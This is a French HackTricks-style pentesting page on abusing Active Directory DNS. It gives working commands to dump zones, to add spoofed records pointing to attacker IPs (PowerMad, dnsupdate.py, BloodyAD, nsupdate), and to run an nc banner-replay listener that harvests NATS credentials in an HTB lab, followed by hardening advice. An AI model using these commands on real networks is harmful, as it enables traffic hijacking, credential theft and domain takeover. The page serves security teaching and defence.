# Enregistrements DNS AD

{{#include ../../banners/hacktricks-training.md}}

Par défaut, **tout utilisateur** dans Active Directory peut **énumérer tous les enregistrements DNS** des zones DNS du domaine ou de la forêt, comme lors d’un transfert de zone (les utilisateurs peuvent lister les objets enfants d’une zone DNS dans un environnement AD).

L’outil [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permet **d’énumérer** et **d’exporter** **tous les enregistrements DNS** de la zone à des fins de reconnaissance des réseaux internes.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

> adidnsdump v1.4.0 (avril 2025) ajoute une sortie JSON/Greppable (`--json`), la résolution DNS multithread et la prise en charge de TLS 1.2/1.3 lors d’une connexion à LDAPS  

Pour en savoir plus, consultez [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Création / modification d’enregistrements (ADIDNS spoofing)

Comme le groupe **Authenticated Users** dispose par défaut du droit **Create Child** sur la DACL de la zone, tout compte de domaine (ou compte d’ordinateur) peut enregistrer des enregistrements supplémentaires. Cela peut servir au détournement de trafic, à la coercition de relais NTLM, voire à la compromission complète du domaine.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py est fourni avec Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitives d’attaque courantes

1. **Enregistrement wildcard** – `*.<zone>` transforme le serveur DNS AD en répondeur à l’échelle de l’entreprise, similaire à l’usurpation LLMNR/NBNS. Il peut être utilisé pour capturer des hashes NTLM ou les relayer vers LDAP/SMB. (Nécessite que la recherche WINS soit désactivée.)<sup>[[1]](#references)</sup>    
2. **Détournement de WPAD** – ajoutez `wpad` (ou un enregistrement **NS** pointant vers un hôte attaquant pour contourner la Global-Query-Block-List), puis faites office de proxy transparent pour les requêtes HTTP sortantes afin de récupérer des identifiants. Microsoft a corrigé les contournements par wildcard/DNAME (CVE-2018-8320), mais les **enregistrements NS fonctionnent toujours**.<sup>[[1]](#references)</sup>    
3. **Prise de contrôle d’une entrée obsolète** – revendiquez l’adresse IP précédemment attribuée à une station de travail : l’entrée DNS associée continuera de se résoudre, permettant des attaques de délégation contrainte basée sur les ressources ou Shadow-Credentials sans toucher au DNS.    
4. **Usurpation DHCP → DNS** – dans un déploiement Windows DHCP+DNS par défaut, un attaquant non authentifié sur le même sous-réseau peut écraser n’importe quel enregistrement A existant (y compris ceux des contrôleurs de domaine) en envoyant des requêtes DHCP forgées qui déclenchent des mises à jour DNS dynamiques (Akamai « DDSpoof », 2023). Cela permet une attaque de l’homme du milieu contre Kerberos/LDAP et peut entraîner la prise de contrôle complète du domaine.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – modifiez le `dNSHostName` d’un compte machine que vous contrôlez, enregistrez un enregistrement A correspondant, puis demandez un certificat pour ce nom afin d’usurper l’identité du DC. Des outils comme **Certipy** ou **BloodyAD** automatisent entièrement le processus.  

Un enregistrement DNS AD contenant des informations de cible [sérialisées](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) peut faire partie d’une chaîne de relais conditionnelle : l’appelant doit disposer des droits de création d’enregistrement, d’un chemin de coercition qui amène l’ordinateur cible à s’authentifier auprès de ce nom, et d’une destination de relais qui accepte l’authentification obtenue. Évaluez séparément le protocole de destination ; la signature SMB sur la connexion entrante ne permet pas, à elle seule, de déterminer si une destination HTTPS WinRM accepte le relais. Le niveau de correctifs, la gestion des noms, Extended Protection et la configuration du service peuvent influer sur le résultat.

---

### Détournement de services internes via des enregistrements dynamiques obsolètes (étude de cas NATS)

Lorsque les mises à jour dynamiques restent accessibles à tous les utilisateurs authentifiés, **un nom de service supprimé peut être revendiqué de nouveau et redirigé vers l’infrastructure d’un attaquant**. Le DC Mirage HTB exposait le nom d’hôte `nats-svc.mirage.htb` après le nettoyage DNS ; tout utilisateur disposant de faibles privilèges pouvait donc :<sup>[[3]](#references)</sup>

1. **Confirmer que l’enregistrement est absent** et trouver le SOA avec `dig` :

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Recréer l’enregistrement** vers une interface externe/VPN qu’ils contrôlent :

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Usurper le service en texte clair**. Les clients NATS s’attendent à recevoir une bannière `INFO { ... }` avant d’envoyer leurs identifiants ; copier une bannière légitime du broker réel suffit donc à récupérer des secrets :

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Tout client qui résout le nom détourné divulguera immédiatement sa trame JSON `CONNECT` (y compris `"user"`/`"pass"`) au listener. Exécuter le binaire officiel `nats-server -V` sur l’hôte de l’attaquant, désactiver la redaction des logs ou simplement renifler la session avec Wireshark révèle les mêmes identifiants en clair, car TLS était facultatif.

4. **Pivoter avec les creds capturés** – dans Mirage, le compte NATS volé donnait accès à JetStream, qui exposait des événements d’authentification historiques contenant des noms d’utilisateur/mots de passe AD réutilisables.

Ce schéma s’applique à chaque service intégré à AD qui repose sur des handshakes TCP non sécurisés (API HTTP, RPC, MQTT, etc.) : une fois l’enregistrement DNS détourné, l’attaquant devient le service.
Pour l’énumération côté broker et le workflow de messages conservés, voir [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Détection et renforcement

* Refuser à **Authenticated Users** le droit *Create all child objects* sur les zones sensibles et déléguer les mises à jour dynamiques à un compte dédié utilisé par DHCP.
* Si les mises à jour dynamiques sont nécessaires, configurer la zone en **Secure-only** et activer **Name Protection** dans DHCP afin que seul l’objet ordinateur propriétaire puisse écraser son propre enregistrement.
* Surveiller les ID d’événement du serveur DNS 257/252 (mise à jour dynamique), 770 (transfert de zone) ainsi que les écritures LDAP dans `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquer les noms dangereux (`wpad`, `isatap`, `*`) à l’aide d’un enregistrement volontairement inoffensif ou via la Global Query Block List.
* Maintenir les serveurs DNS à jour – par exemple, les failles RCE CVE-2024-26224 et CVE-2024-26231 ont atteint un **CVSS de 9.8** et sont exploitables à distance contre les contrôleurs de domaine.



## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Usurpation d’enregistrements DNS en abusant des mises à jour DNS dynamiques de DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
